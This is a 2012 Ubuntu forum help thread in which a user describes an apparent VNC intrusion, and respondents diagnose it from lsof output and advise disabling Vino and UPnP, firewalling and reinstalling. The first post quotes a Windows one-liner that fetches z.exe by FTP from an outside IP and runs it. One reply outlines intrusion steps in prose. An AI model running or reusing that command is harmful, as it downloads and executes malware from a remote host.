---
title: "I've Been Hacked"
date: 2012-04-26
forum: General Help
---

### Post by derpishi on 2012-04-26
Greetings. I am using Ubuntu and need help please!! I came home to find this in a field in Chrome:

> cmd /c echo open 79.137.62.50 21 >> ik &echo user Anonymous Anonymous >> ik &echo binary >> ik &echo get z.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &z.exe &exitkcmd /c echo open 79.137.62.50 21 >> ik &echo user Anonymous Anonymous >> ik &echo bi


I am certain i have been hacked and someone is trying to control my system (even though it looks like DOS commands). Also, two weeks ago, I was at my Ubuntu computer and my mouse started to move and then a command prompt showed up. They started typing rapidly. I immediately turned off internet. They are back. RKHunter returns OK for everything...

Please help me: 
1.) confirm my integrity has been compromised
2.) suggest methods to prevent this from happening.
3.) explain to me how they even got in. I thought I have a secure system :(

I really appreciate any help you can suggest. I am a novice and barely know what /etc is. 

Thanks,
Mark

---

### Post by techsupport on 2012-04-26
> **derpishi said:**
> Greetings. I am using Ubuntu and need help please!! I came home to find this in a field in Chrome:



I am certain i have been hacked and someone is trying to control my system (even though it looks like DOS commands). Also, two weeks ago, I was at my Ubuntu computer and my mouse started to move and then a command prompt showed up. They started typing rapidly. I immediately turned off internet. They are back. RKHunter returns OK for everything...

Please help me: 
1.) confirm my integrity has been compromised
2.) suggest methods to prevent this from happening.
3.) explain to me how they even got in. I thought I have a secure system :(

I really appreciate any help you can suggest. I am a novice and barely know what /etc is. 

Thanks,
Mark

Buy a commercial business router with IPS scanning and block all the ports you don't need open, like port 21 maybe? That's what I recommend.

---

### Post by derpishi on 2012-04-26
I am using a Buffalo wireless router with DD-WRT firmware. can you guide me how to set that up with this. I believe it is available. 

I appreciate all the help you can give!!

---

### Post by techsupport on 2012-04-26
> **derpishi said:**
> I am using a Buffalo wireless router with DD-WRT firmware. can you guide me how to set that up with this. I believe it is available. 

I appreciate all the help you can give!!

That isn't a commercial business router.  And you should call the support company for that make/model router to ask them if there is any security updates for it. Occasionally, they will put out flash ROM upgrades for firmware on most good routers. 

You can also configure IPTables better in Ubuntu with a firewall like GUFW (it is down the list):

[http://debianhelp.wordpress.com/2012/03/09/to-do-list-after-installing-ubuntu-12-04-lts-aka-precise-pangolin/](http://debianhelp.wordpress.com/2012/03/09/to-do-list-after-installing-ubuntu-12-04-lts-aka-precise-pangolin/)

Change your IP address when you get everything reinstalled too. Keep that guy from Italy from bugging you again until you can get your firewall better configured too. (if you were seriously hacked or whatever)

---

### Post by |{urse on 2012-04-26
Hey, that's not linux!

The system in question is running windows, right? 

Reset your router, I recommend firmware reset if you have that option.

Scan yourself with nmap on an external linux computer.

sudo apt-get install nmap zenmap

Scan your system and take note of what ports are open, be sure to close any strange open ports in your router.

Uninstall or disable your antivirus, it's likely already compromised.

Download and rename combofix.exe to "cfix" run combofix [http://www.bleepingcomputer.com/download/anti-virus/combofix](http://www.bleepingcomputer.com/download/anti-virus/combofix)

Download and run malwarebytes 
[http://www.filehippo.com/download_malwarebytes_anti_malware/download/6a5b2c1adb0e88e84ab39920bab1ebbd/](http://www.filehippo.com/download_malwarebytes_anti_malware/download/6a5b2c1adb0e88e84ab39920bab1ebbd/)

Reinstall antivirus, whatever you like.

I like Avira Antivir

---

### Post by |{urse on 2012-04-26
If that is an ubuntu box, the command you found will do nothing at all to your system.

---

### Post by matt_symes on 2012-04-26
Hi

You have remote desktop enabled ? If so then disable it.

Kind regards

---

### Post by mikewhatever on 2012-04-26
I don't think that buying a new router is a good advice in this case. 

@derpishi, can you post the output of 'sudo lsof -i -n -P'. It should show what's running on the system. I strongly suspect you have VNC server enabled, or something similar.

---

### Post by matt_symes on 2012-04-26
Hi

> I strongly suspect you have VNC server enabledYep. I concur.

Also, do you have any forwarded ports on the router ? Is the routers firewall enabled ?

Kind regards

---

### Post by |{urse on 2012-04-26
Yeah, because why would a command like that be in chromes search field? Someone got your vnc or rdp or ssh or sftp etc etc password and accidentally left evidence ^^

---

### Post by derpishi on 2012-04-26
> **mikewhatever said:**
> I don't think that buying a new router is a good advice in this case. 

@derpishi, can you post the output of 'sudo lsof -i -n -P'. It should show what's running on the system. I strongly suspect you have VNC server enabled, or something similar.

here is the output: 


COMMAND     PID   USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
smbd        834   root   22u  IPv6    5379      0t0  TCP *:445 (LISTEN)
smbd        834   root   23u  IPv6    5381      0t0  TCP *:139 (LISTEN)
avahi-dae   880  avahi   13u  IPv4    4622      0t0  UDP *:5353 
avahi-dae   880  avahi   14u  IPv4    4623      0t0  UDP *:38407 
mysqld     1078  mysql   10u  IPv4    5911      0t0  TCP 127.0.0.1:3306 (LISTEN)
master     1155   root   12u  IPv4    5227      0t0  TCP *:25 (LISTEN)
cupsd      1244   root    5u  IPv4 1073848      0t0  TCP *:631 (LISTEN)
cupsd      1244   root    6u  IPv6 1073849      0t0  TCP *:631 (LISTEN)
cupsd      1244   root    8u  IPv4 1073852      0t0  UDP *:631 
bacula-sd  1295 bacula    4u  IPv4    5938      0t0  TCP 127.0.0.1:9103 (LISTEN)
bacula-fd  1332   root    3u  IPv4    5964      0t0  TCP 127.0.0.1:9102 (LISTEN)
bacula-di  1348 bacula    4u  IPv4    6502      0t0  TCP 127.0.0.1:9101 (LISTEN)
thunderbi  1682   mark   75u  IPv4 1709540      0t0  TCP 192.168.11.2:42925->74.125.225.52:443 (ESTABLISHED)
thunderbi  1682   mark   79u  IPv4 1629018      0t0  TCP 192.168.11.2:39684->173.194.67.16:993 (ESTABLISHED)
thunderbi  1682   mark   80u  IPv4 1578546      0t0  TCP 192.168.11.2:37887->209.85.225.16:993 (ESTABLISHED)
thunderbi  1682   mark  160u  IPv4 1052805      0t0  TCP 192.168.11.2:48958->164.109.40.120:80 (ESTABLISHED)
chrome     1686   mark   44u  IPv4 1595829      0t0  TCP 192.168.11.2:54015->209.85.145.125:5222 (ESTABLISHED)
clock-app  1810   mark   22u  IPv4 1687026      0t0  TCP 192.168.11.2:49921->205.234.218.49:80 (CLOSE_WAIT)
clock-app  1810   mark   23u  IPv4 1687027      0t0  TCP 192.168.11.2:37012->198.173.2.56:80 (CLOSE_WAIT)
clock-app  1810   mark   24u  IPv4 1687028      0t0  TCP 192.168.11.2:37013->198.173.2.56:80 (CLOSE_WAIT)
gwibber-s  1898   mark    9u  IPv4   12653      0t0  TCP 127.0.0.1:51790->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   11u  IPv4   12663      0t0  TCP 127.0.0.1:51792->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   15u  IPv4   12675      0t0  TCP 127.0.0.1:51794->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   16u  IPv4   12680      0t0  TCP 127.0.0.1:51795->127.0.0.1:46972 (ESTABLISHED)
gwibber-s  1898   mark   17u  IPv4   12692      0t0  TCP 127.0.0.1:51797->127.0.0.1:46972 (ESTABLISHED)
gwibber-s  1898   mark   18u  IPv4   12696      0t0  TCP 127.0.0.1:51798->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   19u  IPv4   12707      0t0  TCP 127.0.0.1:51800->127.0.0.1:46972 (ESTABLISHED)
gwibber-s  1898   mark   20u  IPv4   12711      0t0  TCP 127.0.0.1:51801->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   21u  IPv4   12728      0t0  TCP 127.0.0.1:51802->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   23u  IPv4 1705510      0t0  TCP 127.0.0.1:46834->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   24u  IPv4   12862      0t0  TCP 127.0.0.1:51811->127.0.0.1:46972 (ESTABLISHED)
gwibber-s  1898   mark   26u  IPv4   12777      0t0  TCP 127.0.0.1:51806->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   27u  IPv4   12799      0t0  TCP 127.0.0.1:51809->127.0.0.1:46972 (CLOSE_WAIT)
gwibber-s  1898   mark   28u  IPv4 1705506      0t0  TCP 127.0.0.1:46833->127.0.0.1:46972 (CLOSE_WAIT)
beam.smp   2004   mark   17u  IPv4   12597      0t0  TCP 127.0.0.1:46972 (LISTEN)
beam.smp   2004   mark   28u  IPv4   12681      0t0  TCP 127.0.0.1:46972->127.0.0.1:51795 (ESTABLISHED)
beam.smp   2004   mark   29u  IPv4   12693      0t0  TCP 127.0.0.1:46972->127.0.0.1:51797 (ESTABLISHED)
beam.smp   2004   mark   32u  IPv4   12708      0t0  TCP 127.0.0.1:46972->127.0.0.1:51800 (ESTABLISHED)
beam.smp   2004   mark   37u  IPv4   12863      0t0  TCP 127.0.0.1:46972->127.0.0.1:51811 (ESTABLISHED)
desktopco  2035   mark   15u  IPv4 1369990      0t0  TCP 127.0.0.1:50329->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   16u  IPv4 1471605      0t0  TCP 127.0.0.1:58026->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   18u  IPv4 1581359      0t0  TCP 127.0.0.1:43135->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   19u  IPv4 1586551      0t0  TCP 127.0.0.1:43037->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   20u  IPv4 1586555      0t0  TCP 127.0.0.1:43038->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   21u  IPv4 1591077      0t0  TCP 127.0.0.1:52439->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   22u  IPv4  283201      0t0  TCP 127.0.0.1:38781->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   23u  IPv4 1591081      0t0  TCP 127.0.0.1:52440->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   24u  IPv4 1701728      0t0  TCP 127.0.0.1:58418->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   25u  IPv4 1701732      0t0  TCP 127.0.0.1:58419->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   26u  IPv4 1390207      0t0  TCP 127.0.0.1:47019->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   27u  IPv4 1413034      0t0  TCP 127.0.0.1:41341->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   29u  IPv4 1489335      0t0  TCP 127.0.0.1:48456->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   30u  IPv4 1581355      0t0  TCP 127.0.0.1:43134->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   36u  IPv4  712493      0t0  TCP 127.0.0.1:35968->127.0.0.1:46972 (CLOSE_WAIT)
desktopco  2035   mark   37u  IPv4 1280071      0t0  TCP 127.0.0.1:36325->127.0.0.1:46972 (CLOSE_WAIT)
nmbd       3182   root    9u  IPv4   18724      0t0  UDP *:137 
nmbd       3182   root   10u  IPv4   18725      0t0  UDP *:138 
nmbd       3182   root   11u  IPv4 1595832      0t0  UDP 192.168.11.2:137 
nmbd       3182   root   12u  IPv4 1595833      0t0  UDP 192.168.11.2:138 
synergyc   3187   mark    6u  IPv4 1675297      0t0  TCP 192.168.11.2:57867->192.168.11.18:24800 (ESTABLISHED)
vino-serv  7049   mark   20u  IPv6  657969      0t0  TCP *:5900 (LISTEN)
gvfsd-htt  9264   mark   14u  IPv4  893157      0t0  TCP 192.168.11.2:33834->91.189.89.31:80 (CLOSE_WAIT)
chrome    29100   mark   75u  IPv4 1595856      0t0  TCP 192.168.11.2:54022->209.85.145.125:5222 (ESTABLISHED)
chrome    29100   mark   97u  IPv4 1704654      0t0  TCP 192.168.11.2:53008->74.125.225.67:443 (ESTABLISHED)
chrome    29100   mark  125u  IPv4 1709831      0t0  TCP 192.168.11.2:60369->74.125.225.32:80 (ESTABLISHED)
dhclient  29449   root    5u  IPv4 1595570      0t0  UDP *:68

---

### Post by derpishi on 2012-04-26
> **matt_symes said:**
> Hi

Yep. I concur.

Also, do you have any forwarded ports on the router ? Is the routers firewall enabled ?

Kind regards
here are the ports open on my router:

23 - telnet
53 - DNS
80 - HTTP
443 - HTTPS

---

### Post by |{urse on 2012-04-26
> vino-serv 7049 mark 20u IPv6 657969 0t0 TCP *:5900 (LISTEN)

Yep vnc.

---

### Post by matt_symes on 2012-04-26
Hi

Disable it :)

Kind regards

---

### Post by techsupport on 2012-04-26
> **mikewhatever said:**
> I don't think that buying a new router is a good advice in this case. 

@derpishi, can you post the output of 'sudo lsof -i -n -P'. It should show what's running on the system. I strongly suspect you have VNC server enabled, or something similar.

Business routers will allow you to manually block all the ports you don't need open.  Maybe the Buffalo router they are using allows that? That's why I recommended that they contact Buffalo support to see if that is an option for this user. I don't know.  The other recommendation was to tighting up IPtables with gufw/ufw.

---

### Post by derpishi on 2012-04-26
> **|{urse said:**
> Yep vnc.

that sux. so, they used port 5900 from my ubuntu vnc? don't they need my username and password?

i changed that a couple days ago when i suspected something. 

am i able to use vnc internally? that is, only computers on my intranet?

---

### Post by matt_symes on 2012-04-26
Hi

> **techsupport said:**
> Business routers will allow you to manually block all the ports you don't need open.  Maybe the Buffalo router they are using allows that? That's why I recommended that they contact Buffalo support to see if that is an option for this user. I don't know.  The other recommendation was to tighting up IPtables with gufw/ufw.

I believe you can do that with dd-wrt techsupport, but i suspect it may depend on the version of dd-wrt.

I flashed my d-link router with the dd-wrt firmware for it and i can ssh into it, set up traffic control and ip tables rules. I suspect the OP can also if he knows how.

Contacting buffalo support may be a good idea or the OP could check out [http://www.dd-wrt.com/site/index](http://www.dd-wrt.com/site/index).

Just some thoughts...

Kind regards

---

### Post by |{urse on 2012-04-26
To disable vino-server run this command.

gconftool-2 --set --type bool /desktop/gnome/remote_access/enabled false

have a look through vino's settings for other options

vino-settings

So far as local-only vnc, if that port is blocked on your router then it is local-only, IF that port was already blocked.. well, I bet you probably know who did it then.

---

### Post by Cavsfan on 2012-04-26
Try this site to see if you have DNS Changer Malware.

[[COLOR=blue]_http://www.dcwg.org/_[/COLOR]]("http://www.dcwg.org/")

It will make you loose Internet access July 1st.

---

### Post by derpishi on 2012-04-26
i just got off the phone with them. all they told me was to make sure the firewall is enabled and block wan requests. i pushed for more answers. they weren't helpful. 

i need to figure out how to control up tables rules.

---

### Post by techsupport on 2012-04-26
> **derpishi said:**
> i just got off the phone with them. all they told me was to make sure the firewall is enabled and block wan requests. i pushed for more answers. they weren't helpful. 

i need to figure out how to control up tables rules.

Well you could try using different firmware as suggested, or buy a business router that will allow you to selectively block ports you don't want open to the Internet, but allow open for your Intranet and local VNC clients. If you want to have a very secure intranet, you are going to need to do more than rely on iptables to handle that role. A business router w/highly configured firewall is really the best advice to give if you want to avoid a repeat of something like that.

---

### Post by derpishi on 2012-04-26
i typed that command. thx. 

how do i find out if that port is blocked on my router?

---

### Post by derpishi on 2012-04-26
> **|{urse said:**
> To disable vino-server run this command.

gconftool-2 --set --type bool /desktop/gnome/remote_access/enabled false

have a look through vino's settings for other options

vino-settings

So far as local-only vnc, if that port is blocked on your router then it is local-only, IF that port was already blocked.. well, I bet you probably know who did it then.

the remote desktop settings in ubuntu says:

Your desktop is only reachable over the local network. Others can access your computer using the address 192.168.11.2 or Vyvoda-Laptock.local.

However, that is not true. what gives?

---

### Post by |{urse on 2012-04-26
Sorry to send you off to google.
Log into your router, type 192.168.2.1 or 192.168.1.1 or some variation of that in a web-browser (depends on your router and how it was set up, have a google at that)
Then have a look-see at google for instructions on how to open and close ports with your router. I'm not familiar with Buffalo's products so hopefully someone will have posted a manual. Check the manufacturer's site first.

---

### Post by mikewhatever on 2012-04-26
> vino-serv 7049 mark 20u IPv6 657969 0t0 TCP *:5900 (LISTEN)

You can test if port 5900 is accessible from outside:

[https://www.grc.com/x/portprobe=5900](https://www.grc.com/x/portprobe=5900)
[http://www.canyouseeme.org/](http://www.canyouseeme.org/)

It probably is, especially if upnp is enabled on the router.

Either disable remote desktop entirely, or block port 5900 on the router.

---

### Post by derpishi on 2012-04-26
> **mikewhatever said:**
> You can test if port 5900 is accessible from outside:

[https://www.grc.com/x/portprobe=5900](https://www.grc.com/x/portprobe=5900)
[http://www.canyouseeme.org/](http://www.canyouseeme.org/)

It probably is, especially if upnp is enabled on the router.

Either disable remote desktop entirely, or block port 5900 on the router.

I am confused still. That site says 5900 is not open to to WAN. I have tried this with both remote deskop enabled and disabled. However, the hacker obviously used that to get into my system. 

Can you explain that to me, as I don't quite understand it.

---

### Post by mikewhatever on 2012-04-26
Not really sure, the way you described it looked a lot like a Remote Desktop intrusion (moving cursor and popping windows), and the Vino VNC, server, which you have enabled, is known to be misused and abused in Ubuntu. 
Keep and eye on the running processes and open ports.

This looks familiar: [http://www.highseverity.com/2011/11/accidentally-opening-doors-on-ubuntu.html](http://www.highseverity.com/2011/11/accidentally-opening-doors-on-ubuntu.html)

---

### Post by derpishi on 2012-04-26
> **mikewhatever said:**
> Not really sure, the way you described it looked a lot like a Remote Desktop intrusion (moving cursor and popping windows), and the Vino VNC, server, which you have enabled, is known to be misused and abused in Ubuntu. 
Keep and eye on the running processes and open ports.

An update: I can not connect to the internet in anyway shape or form. Even a hardwire. Looks like the hacker somehow did something there to. I guess ill burn my data on a disc and reinstall. I still need to know now they got into my system. Any ideas?

---

### Post by |{urse on 2012-04-26
Oh, nice. Well, as you know you're compromised already so i'd suggest reinstalling your os and changing passwords very quickly.

---

### Post by Habitual on 2012-04-26
Block 79.137.62.50

---

### Post by pqwoerituytrueiwoq on 2012-04-26
i suggest making sure they did not edit your routers settings if you don't want to deal with that you can use the reset button (probably need a ink pen or a paper clip to hit it) on the router
you can always setup a [firewall](apt:gufw) on your system

there is no need to buy a new router especially if it supports dd-wrt

---

### Post by Habitual on 2012-04-26
> **derpishi said:**
> ...3.) explain to me how they even got in. I thought I have a secure system ...

Mark:

The **only** "secure" system is one that is not connected to the Internet.
Open any PDFs from the Internet lately?

Try scanning with clamAV...in a repo near you. Also, if you are not comfortable with c-li scanning, there's a GUI frontend for ClamAV ("ClamAV-gtk" maybe...?)

HTH.

---

### Post by techsupport on 2012-04-26
> **Habitual said:**
> Mark:

The **only** "secure" system is one that is not connected to the Internet.
Open any PDFs from the Internet lately?

Try scanning with clamAV...in a repo near you. Also, if you are not comfortable with c-li scanning, there's a GUI frontend for ClamAV ("ClamAV-gtk" maybe...?)

HTH.

There is Bitdefender as well: (down the list)

[http://debianhelp.wordpress.com/2012/03/09/to-do-list-after-installing-ubuntu-12-04-lts-aka-precise-pangolin/](http://debianhelp.wordpress.com/2012/03/09/to-do-list-after-installing-ubuntu-12-04-lts-aka-precise-pangolin/)

:guitar:

---

### Post by bodhi.zazen on 2012-04-26
> **mikewhatever said:**
> I don't think that buying a new router is a good advice in this case. 

@derpishi, can you post the output of 'sudo lsof -i -n -P'. It should show what's running on the system. I strongly suspect you have VNC server enabled, or something similar.

I concur with advice on this thread.

You have an intruder, most likely through VNC (most common crack I see on these forums).

Most of the other pieces of advice are sort of semi-helpful.

First, you have to decide what you are going to do. Fresh install or forensics.

If you want to investigate, disconnect the computer from the internet (unplug the network cable and disable wireless).

Investigate all you wish, but understand that in a compromised system commands such as "lsof" can be compromised. 

I suggest you read up on forensics if you wish to pursue this topic further.

It is likely that the intruder got in through VNC and if you have to ask for low level help here I would assume your intruder has more knowledge then you, so I would re-install.

Disable or secure any servers you are running. A firewall helps, but is not a panacea.

Read the security sticky, all of it.

---

### Post by techsupport on 2012-04-26
> **bodhi.zazen said:**
> I concur with advice on this thread.

A firewall helps, but is not a panacea.



That's interesting. Why though? afaik the user had local VNC configured, but they had a basic Buffalo router with a very basic inadequate firewall.  With a better router you can secure your entire local intranet regardless of whatever OS you choose to install for systems. That's the way I was trained as a network technician -if- you want a strong and secure local intranet foundation.  And then you need to make sure you have your UFW configured and running at startup, if you plan on installing Ubuntu OS. That isn't set up by default in Ubuntu, and if you are going to be using VNC or whatever, with those ports open for the entire internet, when you only really need it to be availble for your local intranet network clients, then you need a definite way to secure that intranet from the outside internet intrusions, like they are now are reporting. A better router with more options enabled would have easily prevented something like this from happening.

---

### Post by derpishi on 2012-04-27
> **pqwoerituytrueiwoq said:**
> i suggest making sure they did not edit your routers settings if you don't want to deal with that you can use the reset button (probably need a ink pen or a paper clip to hit it) on the router
you can always setup a [firewall](apt:gufw) on your system

there is no need to buy a new router especially if it supports dd-wrt

update: i fresh installed Ubuntu and router settings. I am still having problems connecting to the internet (wireless & wired!). can you point me in the general direction to trouble shoot this? i highly doubt it has to do with my hack...

---

### Post by techsupport on 2012-04-27
> **derpishi said:**
> update: i fresh installed Ubuntu and router settings. I am still having problems connecting to the internet (wireless & wired!). can you point me in the general direction to trouble shoot this? i highly doubt it has to do with my hack...

Did you start a trouble ticket with your ISP yet? They can even check your router for you to see if there is anything they can do to beef up security on there too.  They even have logs they can check to see if anyone has been making malicious ISP service calls in your name.

Also here is a guide to help you with the post install process on 12.04:

[http://debianhelp.wordpress.com/2012/03/09/to-do-list-after-installing-ubuntu-12-04-lts-aka-precise-pangolin/](http://debianhelp.wordpress.com/2012/03/09/to-do-list-after-installing-ubuntu-12-04-lts-aka-precise-pangolin/)

---

### Post by bodhi.zazen on 2012-04-27
> **techsupport said:**
> That's interesting. Why though? afaik the user had local VNC configured, but they had a basic Buffalo router with a very basic inadequate firewall.  With a better router you can secure your entire local intranet regardless of whatever OS you choose to install for systems. That's the way I was trained as a network technician -if- you want a strong and secure local intranet foundation.  And then you need to make sure you have your UFW configured and running at startup, if you plan on installing Ubuntu OS. That isn't set up by default in Ubuntu, and if you are going to be using VNC or whatever, with those ports open for the entire internet, when you only really need it to be availble for your local intranet network clients, then you need a definite way to secure that intranet from the outside internet intrusions, like they are now are reporting. A better router with more options enabled would have easily prevented something like this from happening.

sort of depends on the server.

If it is a public server, such as apache, you are going to allow all traffic, and deny IP if they act up, so how does it help ?

If it is a private server, you can deny all, and allow a white list.

In the case of VNC, the behavior is likely to be "public" in that often people will want to connect from remote computers with unknown ip addresses.

A firewall can help if your attacker wants to start unauthorized servers, and you can filter outgoing traffic. I assume you are going to allow traffic going out to web servers (port 80) , so in that case, attacker connects to a remote server listening on port 80.

In the case of VNC, tunnel it over ssh. If you do so you significantly increase VNC security. In that event , your ssh port would be public and the VNC port (5900) fire walled.

A better question is what do you want a firewall to do for you and how to best configure it.

---

### Post by |{urse on 2012-04-27
Be sure to do a firmware reset on your router, and set password. So far as your connectivity, call your isp and ask them to change your ip (if it is static) you may be getting ddos'd.

---

### Post by dcstar on 2012-04-28
> **derpishi said:**
> update: i fresh installed Ubuntu and router settings. I am still having problems connecting to the internet (wireless & wired!). can you point me in the general direction to trouble shoot this? i highly doubt it has to do with my hack...

Still having trouble eh, possibly a Windows PC on your network that is full of malware and/or someone has "hacked" your wireless connection.

---

### Post by derpishi on 2012-04-30
> **dcstar said:**
> Still having trouble eh, possibly a Windows PC on your network that is full of malware and/or someone has "hacked" your wireless connection.

I appreciate everyone's help. Here's an update and a question. I fresh installed Ubuntu 12.04 & Router to factory default. I am now having trouble connecting my network and android phone (believe it or not) to the wireless. 

I am at a hotel now, and they both connect. only at home, they do not. 

my question is, is it possible the so-called hacker make it impossible for my ubuntu and android to be able to connect to the wireless router?

[B]if possible, can you start to suggest where i might look in my ubuntu filesystem to check if this has happened?
[/B]
sorry for such a fragmented message, but i am unsure where to go from here. i will be calling my router company to, but they are little to no help thus far...

---

### Post by Habitual on 2012-04-30
> **derpishi said:**
> ...I am at a hotel now, and they both connect. only at home, they do not....

Since it works at the Hotel but not at home, it's a configuration issue.

---

### Post by derpishi on 2012-05-02
> **Habitual said:**
> Since it works at the Hotel but not at home, it's a configuration issue.

You are right, indeed. It was my router settings. In an effort to increase my security (after this hacker breach) I was filtering WAN NAT redirection. This was the cause of my Android phone and Ubuntu laptop not allowing me to connect to DHCP. Apparently Linux and Mac user can not connect with these settings enabled. 

I am using a Buffalo Router (G3000NH) with DD-WRT firmware (build 14998.

---

### Post by zero2xiii on 2012-05-02
Sigh,

Everyone thinks so technical, and with good reason. I can promise you on a few small facts one or more of the following was done by you:

1. YOU NEVER CHANGED THE DEFAULT USERNAME AND PASSWORD ON YOUR ROUTER
2. You never cared to read the security risks involved with setting up a vnc, or chose to deny it. If there were no information, it was from an unreliable source or outdated.
3. You do not have a strong (or even no) password set up. And "mYuSerName123456" is NOT a strong password.
4. You used a regular/common/default port... Sigh...
5. Your router is not configured to ignore port scans and ping requests.
6. You have a guest account on your computer.
7. You have a compromised windows machine on your network..
8. Your user and computer/host name is the same

The list goes on and on.. Curiously, how DID you find the command that was "used".

As far as how the "hacker" got access.. Unless you have some really sensitive information on your computer and the hacker was after that, here is how:

He did a randomrange port scan
Saw your vnc port is open, or transparent
Tried to connect and if he could, simply brute forced the password and username.
If he was refused connection, accessed the router, using the default username and password (sigh, google)
Got your computer information from the router (most if not ALL routers has some way to show you what computers are currently connected, the IP and host name of the computer)
Now he has the first pasrt of the puzzel.
He now simply set up the port forward to work correctly and bam.
He now simply brute forced your password.

If he was a bit more skill and desperate to get in, he simply set up the router to forward the packets containing VNC auth packets to his computer, and got the password from them. This should take about... 7 minutes to set up if he was unfamiliar with the router... 

Really. This is a no brainer. Follow all the excelent advice the comunity has given you. And see the list I posted, and DON'T DO THAT.. Its like hanging a board on your house "please rob me, cause I am to ****ing lazy to lock my home, I can even help you carry the stuff you want out"

However, I suspect the "hacker" was following a tutorial and you were the unlucky person he practised on. Any skilled, or even just some knowledgeable hacker will know how to cover their tracks. Not clearing log files and so forth, but atleast clear the recent commands list. And recent connections lists. And even used a proxy... If he formulated that command himself, and cant think to do that? I would be seriously surprised.

Well good luck with recovery, and please pay attention to protecting your system. We do not want you to become a part of some botnet network :).

CHerz

---

### Post by derpishi on 2012-05-02
> **zero2xiii said:**
> Sigh,

Everyone thinks so technical, and with good reason. I can promise you on a few small facts one or more of the following was done by you:

1. YOU NEVER CHANGED THE DEFAULT USERNAME AND PASSWORD ON YOUR ROUTER
2. You never cared to read the security risks involved with setting up a vnc, or chose to deny it. If there were no information, it was from an unreliable source or outdated.
3. You do not have a strong (or even no) password set up. And "mYuSerName123456" is NOT a strong password.
4. You used a regular/common/default port... Sigh...
5. Your router is not configured to ignore port scans and ping requests.
6. You have a guest account on your computer.
7. You have a compromised windows machine on your network..
8. Your user and computer/host name is the same

The list goes on and on.. Curiously, how DID you find the command that was "used".

As far as how the "hacker" got access.. Unless you have some really sensitive information on your computer and the hacker was after that, here is how:

He did a randomrange port scan
Saw your vnc port is open, or transparent
Tried to connect and if he could, simply brute forced the password and username.
If he was refused connection, accessed the router, using the default username and password (sigh, google)
Got your computer information from the router (most if not ALL routers has some way to show you what computers are currently connected, the IP and host name of the computer)
Now he has the first pasrt of the puzzel.
He now simply set up the port forward to work correctly and bam.
He now simply brute forced your password.

If he was a bit more skill and desperate to get in, he simply set up the router to forward the packets containing VNC auth packets to his computer, and got the password from them. This should take about... 7 minutes to set up if he was unfamiliar with the router... 

Really. This is a no brainer. Follow all the excelent advice the comunity has given you. And see the list I posted, and DON'T DO THAT.. Its like hanging a board on your house "please rob me, cause I am to ****ing lazy to lock my home, I can even help you carry the stuff you want out"

However, I suspect the "hacker" was following a tutorial and you were the unlucky person he practised on. Any skilled, or even just some knowledgeable hacker will know how to cover their tracks. Not clearing log files and so forth, but atleast clear the recent commands list. And recent connections lists. And even used a proxy... If he formulated that command himself, and cant think to do that? I would be seriously surprised.

Well good luck with recovery, and please pay attention to protecting your system. We do not want you to become a part of some botnet network :).

CHerz

i was using VNC. UPnP was auto-configured, so he must have seen port 5900 open to the world. he was smart enough to get my password though. you say it is easy to get someone's password. that is troubling. there was no brute force. my password is above average. like "YourM@mma3452"

how did he set up the router to forward the packets containing VNC to his comp? that is crafty. how can i prevent it while still allowing VNC on my intranet? my router has a firewall and pretty good security from my understanding.

---

### Post by bodhi.zazen on 2012-05-02
> **derpishi said:**
> i was using VNC. UPnP was auto-configured, so he must have seen port 5900 open to the world. he was smart enough to get my password though. you say it is easy to get someone's password. that is troubling. there was no brute force. my password is above average. like "YourM@mma3452"

how did he set up the router to forward the packets containing VNC to his comp? that is crafty. how can i prevent it while still allowing VNC on my intranet? my router has a firewall and pretty good security from my understanding.

Are you serious ? Look up UPnP, I advise disabling UPnP

---

### Post by haqking on 2012-05-02
> **bodhi.zazen said:**
> Are you serious ? Look up UPnP, I advise disabling UPnP

+1

Disable UPNP

Dont use VNC, it is less secure than your paycheck with the taxman or your credit cards with your wife

---

### Post by derpishi on 2012-05-02
> **haqking said:**
> +1

Disable UPNP

Dont use VNC, it is less secure than your paycheck with the taxman or your credit cards with your wife

yes, it's been disabled. i used logmein for windows to remote into my computer. what about for ubuntu? any suggestions?

---

### Post by bodhi.zazen on 2012-05-02
> **derpishi said:**
> yes, it's been disabled. i used logmein for windows to remote into my computer. what about for ubuntu? any suggestions?

FreeNX

---

### Post by derpishi on 2012-05-02
> **bodhi.zazen said:**
> FreeNX

I don't believe you can install it on 12.04

EDIT: read this to install FreeNX in Precise:
[http://ubuntuforums.org/showthread.php?t=1840679&page=2](http://ubuntuforums.org/showthread.php?t=1840679&page=2)

---

